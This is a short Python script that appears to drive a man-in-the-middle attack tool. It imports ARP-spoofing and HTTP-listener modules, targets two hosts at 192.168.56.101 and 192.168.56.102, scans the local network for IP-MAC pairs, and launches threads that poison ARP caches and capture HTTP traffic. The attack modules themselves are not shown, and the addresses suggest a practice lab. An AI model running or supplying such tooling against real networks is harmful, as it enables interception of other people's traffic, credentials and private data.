import arp_spoof
import http_listener

arp = arp_spoof.ArpSpoof('192.168.56.101', '192.168.56.102')
arp.scan_local_network()
print(arp.ip_mac_pairs)
http_l = http_listener.HttpListener(arp)
arp.start()
http_l.start()
arp.join()
http_l.join()